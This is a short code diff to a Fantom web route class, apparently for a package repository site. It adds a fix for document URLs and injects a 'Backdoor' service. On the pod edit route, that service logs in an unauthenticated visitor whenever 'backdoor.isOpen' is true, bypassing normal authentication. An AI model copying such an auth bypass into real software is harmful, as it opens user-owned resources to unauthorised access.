@@ -7,6 +7,7 @@ const class PodRoutes : Route {
 	@Inject	private const UserSession	userSession
 	@Inject	private const Pages	 		pages
 	@Inject	private const RepoPodDao	podDao
+	@Inject private const Backdoor		backdoor
 
 	new make(|This|in) { in(this) }
 	
@@ -57,6 +58,9 @@ const class PodRoutes : Route {
 			fileUrl := `/doc/` + ((podVersion == null) ? httpReq.url[3..-1] : httpReq.url[4..-1]).relTo(`/`)
 			if (fileUrl == `/doc/`)
 				fileUrl = fileUrl.plusName("pod.fandoc")
+			if (fileUrl.ext == null)
+				fileUrl = fileUrl.plusName("${fileUrl.name}.fandoc")
+			
 			// TODO: handle images and other files
 			return pages.renderPage(PodDocPage#, [pod, fileUrl])
 		}
@@ -80,9 +84,12 @@ const class PodRoutes : Route {
 		// --> /pods/afSlim/edit
 		// --> /pods/afSlim/1.1.14/edit
 		if (podSection == "edit" && reqPath.isEmpty) {
+			if (!userSession.isLoggedIn && backdoor.isOpen)
+				backdoor.login
+
 			if (userSession.isLoggedIn) {
 				if (userSession.user.owns(pod)) 
-					return pages.renderPage(PodEditPage#, [pod])	
+					return pages.renderPage(PodEditPage#, [pod])
 				throw HttpStatusErr(401, "Unauthorised")
 			}
 			throw ReProcessErr(Redirect.movedTemporarily(pages[LoginPage#].pageUrl))
